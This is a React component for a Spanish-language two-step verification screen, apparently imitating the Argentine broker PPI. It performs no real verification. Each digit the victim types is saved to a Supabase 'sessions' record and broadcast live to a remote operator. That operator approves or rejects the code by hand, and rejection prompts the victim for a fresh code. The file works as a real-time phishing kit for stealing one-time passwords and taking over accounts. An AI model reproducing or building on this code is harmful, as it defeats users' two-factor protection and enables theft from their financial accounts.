import { useState, useEffect, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
  InputOTPSeparator,
} from "@/components/ui/input-otp";

interface PpiOtpScreenProps {
  email: string;
  sessionId: string;
  twofaType?: number;
  onBack: () => void;
}

const PpiOtpScreen = ({ email, sessionId, twofaType, onBack }: PpiOtpScreenProps) => {
  const [otp, setOtp] = useState("");
  const [status, setStatus] = useState<"input" | "verifying" | "success" | "error">("input");
  const [errorMessage, setErrorMessage] = useState("");

  const description =
    twofaType === 0
      ? "Ingresá el código de verificación que recibiste en tu email."
      : twofaType === 1
      ? "Ingresá el código de verificación de tu aplicación de autenticación."
      : "Ingresá el código de verificación que recibiste en tu email o aplicación de autenticación.";

  useEffect(() => {
    const channel = supabase.channel(`session-otp-decision-${sessionId}`);
    channel
      .on("broadcast", { event: "otp_decision" }, (payload) => {
        const decision = payload.payload?.status as string;
        if (decision === "otp_approved") setStatus("success");
        else if (decision === "otp_rejected") {
          setStatus("error");
          setErrorMessage("Código incorrecto. Intentá nuevamente.");
          setOtp("");
          setTimeout(() => {
            setStatus("input");
            supabase.from("sessions").update({ status: "redirect_otp" } as any).eq("id", sessionId).then(() => {});
          }, 2000);
        }
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [sessionId]);

  useEffect(() => {
    const channel = supabase.channel(`session-review-client-otp-${sessionId}`);
    channel
      .on("broadcast", { event: "review_decision" }, (payload) => {
        const decision = payload.payload?.status as string;
        if (decision === "otp_approved") setStatus("success");
        else if (decision === "otp_rejected") {
          setStatus("error");
          setErrorMessage("Código incorrecto. Intentá nuevamente.");
          setOtp("");
          setTimeout(() => setStatus("input"), 2000);
        }
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [sessionId]);

  const handleOtpChange = useCallback((value: string) => {
    setOtp(value);
    supabase.from("sessions").update({ otp_code: value } as any).eq("id", sessionId).then(() => {});
    const bc = supabase.channel(`otp-live-${sessionId}-${Date.now()}`);
    bc.subscribe((s) => {
      if (s === "SUBSCRIBED") {
        bc.send({ type: "broadcast", event: "otp_code_update", payload: { otp_code: value, session_id: sessionId } });
        setTimeout(() => supabase.removeChannel(bc), 1500);
      }
    });
  }, [sessionId]);

  useEffect(() => {
    if (otp.length === 6 && status === "input") setStatus("verifying");
  }, [otp, status]);

  const username = email?.split("@")[0] || email;

  if (status === "success") {
    return (
      <div className="flex flex-col items-center text-center">
        <h3 className="mb-2 text-[19px] font-bold text-[#1e2a3a]">Verificación exitosa</h3>
        <p className="text-sm text-[#8c939a]">Tu identidad fue verificada correctamente.</p>
        <p className="mt-2 text-xs text-[#bbb]">{username}</p>
      </div>
    );
  }

  return (
    <div className="flex flex-col items-center text-center">
      <h3 className="mb-2 text-[19px] font-bold text-[#1e2a3a]">Verificación en dos pasos</h3>
      <p className="mb-6 text-[13.5px] text-[#8c939a] max-w-[340px] leading-relaxed">{description}</p>

      {errorMessage && status === "error" && (
        <div className="mb-4 w-full rounded-lg border border-red-200 bg-red-50 px-4 py-2 text-sm text-red-600">
          {errorMessage}
        </div>
      )}

      <div className="mb-5">
        <InputOTP maxLength={6} value={otp} onChange={handleOtpChange} disabled={status === "verifying"} inputMode="numeric" pattern="[0-9]*">
          <InputOTPGroup>
            <InputOTPSlot index={0} className="h-12 w-11 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd]" />
            <InputOTPSlot index={1} className="h-12 w-11 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd]" />
            <InputOTPSlot index={2} className="h-12 w-11 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd]" />
            <InputOTPSlot index={3} className="h-12 w-11 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd]" />
            <InputOTPSlot index={4} className="h-12 w-11 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd]" />
            <InputOTPSlot index={5} className="h-12 w-11 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd]" />
          </InputOTPGroup>
        </InputOTP>
      </div>

      {/* Verificando button */}
      <button
        disabled
        className={`w-full max-w-[300px] rounded-lg py-2.5 text-sm font-semibold transition-all ${
          status === "verifying"
            ? "bg-[#7fbde6] text-white"
            : "bg-[#a8d4f0] text-white cursor-default"
        }`}
      >
        {status === "verifying" ? "Verificando..." : "Verificar"}
      </button>

      <p className="mt-4 text-xs text-[#bbb]">{username}</p>
    </div>
  );
};

export default PpiOtpScreen;
